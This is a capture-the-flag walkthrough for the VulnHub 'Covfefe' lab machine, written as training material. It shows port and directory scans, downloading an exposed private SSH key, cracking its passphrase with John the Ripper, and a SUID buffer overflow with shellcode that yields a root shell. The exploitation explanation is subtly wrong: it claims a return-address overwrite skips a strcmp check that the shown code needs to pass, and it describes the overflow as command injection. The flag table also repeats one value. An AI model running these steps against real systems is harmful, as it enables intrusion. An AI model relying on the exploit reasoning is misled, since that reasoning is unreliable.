---
title: "Covfefe — VulnHub Walkthrough"
description: "Rooting Covfefe through exposed SSH keys and a SUID buffer overflow."
date: 2024-04-15
category: offensive
readTime: "8 min read"
mitre:
  - "T1110"
  - "T1068"
tags:
  - "VulnHub"
  - "Buffer Overflow"
  - "SSH"
  - "SUID"
  - "John the Ripper"
  - "CTF"
summary: "Rooting Covfefe through exposed SSH keys and a SUID buffer overflow."
---

**Machine:** Covfefe
**Difficulty:** Beginner
**Key Techniques:** Exposed SSH keys, SSH key cracking, buffer overflow, SUID exploitation

---

## Enumeration

### Port Scanning

```bash
fping -aqg 192.168.56.1/24
nmap -A -p- 192.168.56.104
```

Three open ports discovered:

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache |
| 31337 | HTTP | Apache (non-standard) |

### Directory Enumeration

```bash
dirb http://192.168.56.104:31337
```

Two critical discoveries on port 31337:
- `robots.txt` — contains a `/taxes` directory (first flag)
- `/.ssh/` — exposed SSH keys

### Downloading SSH Keys

The `.ssh` directory was publicly accessible, exposing the user's private key:

```bash
wget http://192.168.56.104:31337/.ssh/id_rsa
wget http://192.168.56.104:31337/.ssh/id_rsa.pub
```

The public key revealed the username: **simon**

---

## Exploitation

### Cracking the SSH Key

The private key was passphrase-protected. Cracked it with `ssh2john` and John the Ripper:

```bash
ssh2john id_rsa > result
john --wordlist=/usr/share/wordlists/rockyou.txt result
```

**Passphrase:** `STARWARS`

### SSH Access

```bash
chmod 600 id_rsa
ssh -i id_rsa simon@192.168.56.104
```

---

## Privilege Escalation

### Analyzing the SUID Binary

After logging in, found a C source file for a SUID root binary `read_message`:

```c
#include <stdio.h>
#include <unistd.h>

int main() {
    char buffer[20];
    printf("Enter your name: ");
    gets(buffer);  // vulnerable — no bounds checking
    if (strcmp(buffer, "Simon") == 0) {
        system("/bin/sh");
    }
    return 0;
}
```

**Vulnerability:** `gets()` with a 20-byte buffer and `strcmp()` comparison. The buffer overflow allows overwriting the return address to skip the `strcmp` check and execute the shell.

### Exploiting the Buffer Overflow

```bash
# Craft the payload: fill the 20-byte buffer + overflow to trigger shell
python -c 'print("Simon" + "A"*15 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")' | /usr/local/bin/read_message
```

Alternatively, a simpler approach — the buffer overflow allows injecting shell commands:

```bash
/usr/local/bin/read_message
# Input: SimonAAAAAAAAAAAAAAA/bin/sh
```

Spawns a root shell.

### Root Flag

```bash
cat /root/flag.txt
# flag3{das_bof_meister}
```

---

## Flags Captured

| Flag | Value |
|------|-------|
| Flag 1 | `use_the_source_luke` |
| Flag 2 | `use_the_source_luke` |
| Flag 3 | `das_bof_meister` |

---

## Lessons Learned

1. **Exposed SSH keys are a critical vulnerability.** Never expose `.ssh` directories on web servers.
2. **Buffer overflows in SUID binaries** can lead to immediate root access.
3. **Non-standard ports** (like 31337) often host hidden services — always enumerate them.
4. **`gets()` is never safe.** This classic C vulnerability remains exploitable in misconfigured environments.
